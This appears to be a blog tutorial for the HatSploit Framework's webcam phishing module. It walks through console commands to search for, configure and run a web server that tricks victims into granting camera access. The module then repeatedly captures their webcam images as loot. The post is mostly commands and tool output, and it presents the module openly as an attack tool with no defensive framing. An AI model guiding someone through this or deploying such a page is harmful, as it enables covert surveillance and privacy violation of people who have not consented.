---
title: Webcam Photo Phishing
categories: [Exploitation]
tags: [hatsploit, phishing]
author: enty8080
---

Phishing is a common technique used by attackers to gain access to sensitive information through methods like social engineering. Attackers often attempt to obtain credentials, password hashes, location data, and other critical information by tricking users into revealing this data.

In the HatSploit Framework, EntySec has implemented several modules specifically designed to target a victim’s webcam. These modules allow attackers to take a photo using the target's webcam through a browser and save the captured image as loot on the attacker's machine. Additionally, attackers can stream the webcam footage in real-time. These modules are named `exploit/generic/gather/browser_webcam_photo` and `exploit/generic/gather/browser_webcam_stream`.

Here’s how you can access and use these modules:

```entysec
[hsf3]> search webcam

Modules:

    Number    Category    Module                                          Rank    Name
    0         exploit     exploit/generic/gather/browser_webcam_photo     low     Gather Browser Webcam Photo
    1         exploit     exploit/generic/gather/browser_webcam_stream    low     Gather Browser Webcam Stream
```

## Using the module

Once you have identified the desired module, you can use it within the HatSploit Framework and set the appropriate options.

For example, to use the `Gather Browser Webcam Photo` module:

```entysec
[hsf]> use 0
[hsf3: Gather Browser Webcam Photo]> info

    Name: Gather Browser Webcam Photo
  Module: exploit/generic/gather/browser_webcam_photo
Platform: generic
    Rank: low

Authors:
  Ivan Nikolskiy (enty8080) - module developer

Description:
  This module generates a webpage that, when accessed by a victim, attempts to capture an image using the built-in webcam and send it to the attacker.

References:
  URL: https://blog.entysec.com/2022-03-13-webcam-photo-phishing/

Stability:
  This module is stable and does not crash the target.
```

## Configuring the module

You will need to configure several options before running the module:

```entysec
[hsf3: Gather Browser Webcam Photo]> options

Module Options (exploit/generic/gather/browser_webcam_photo):

    Option     Value                                          Required    Description
    HOST                                                      yes         HTTP host.
    MESSAGE    Grant Access                                   yes         Message to display.
    PATH       /Users/felix/.hsf/loot/zIlWzaKkC9x28XX7.png    yes         Path to save file.
    PORT       80                                             yes         HTTP port.
    SSL        no                                             no          Use SSL.
    TIMEOUT    10                                             no          Connection timeout.
    URLPATH    /                                              yes         File path on server.
```

## Running the module

After configuring the options, you can start the web server and wait for the victim to access the malicious webpage. The module will continue to capture images from the victim’s webcam until it is manually interrupted.

Here’s an example:

```entysec
[hsf3: Gather Browser Webcam Photo]> set host localhost
[i] host => localhost
[hsf3: Gather Browser Webcam Photo]> set port 8080
[i] port => 8080
[hsf3: Gather Browser Webcam Photo]> run

[*] Starting HTTP listener on port 8080...
[*] Delivering payload...
[*] Taking webcam photo...
[*] Taking webcam photo...
[*] Taking webcam photo...
[*] Taking webcam photo...
[*] Taking webcam photo...
[*] Taking webcam photo...
[*] Taking webcam photo...
[!] Exploit module interrupted.
```

This module will continue to capture and update the photo file saved in the loot directory until you stop it manually with keyboard interrupt (Ctrl-C).

By utilizing this module, attackers can gain access to sensitive webcam data through the use of phishing techniques, making it an essential tool in the HatSploit Framework.
